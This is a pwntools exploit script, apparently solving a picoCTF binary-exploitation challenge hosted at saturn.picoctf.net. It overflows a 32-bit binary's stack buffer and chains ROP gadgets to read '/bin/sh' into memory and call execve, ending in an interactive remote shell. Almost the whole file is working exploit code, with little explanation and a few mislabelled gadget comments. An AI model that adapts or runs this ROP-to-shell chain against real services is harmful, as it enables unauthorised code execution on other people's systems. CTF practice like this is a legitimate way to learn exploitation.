#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln '--host=saturn.picoctf.net' '--port=58573'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')
context.terminal = ["alacritty", "-e", "zsh", "-c"]
# Many built-in settings can be controlled on the scommand-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 59914)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

# 0x080b3932: pop esi; pop edi; ret;
# 0x080583e9: pop edx; pop ebx; ret;
# 0x080b073a: pop eax; ret;
# 0x08049e29: pop ecx; ret;
# scriverlo a mano
# 0x80e7000
# 0x08071640: int 0x80; ret;

payload = b"A" * 28

payload += p32(0x080b073a)  # pop eax; ret; 
payload += p32(0x03)       # write sys number 
payload += p32(0x080583e9) # pop edx; pop ebx; ret;
payload += p32(0x08)
payload += p32(0x00)
payload += p32(0x08049e29) # pop ecx; ret;
payload += p32(0x80e5050)
payload += p32(0x08071640) # int 0x80; ret; 

payload += p32(0x080b073a) # pop eax; ret;
payload += p32(0xb)        # execve syscall
payload += p32(0x080583e9) # pop edx; pop ebx; ret;
payload += p32(0x00)
payload += p32(0x80e5050)  
payload += p32(0x08049e29) # pop rcx; ret
payload += p32(0x00)
payload += p32(0x08071640) # int 0x80; ret;

io.recvline()
io.sendline(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()

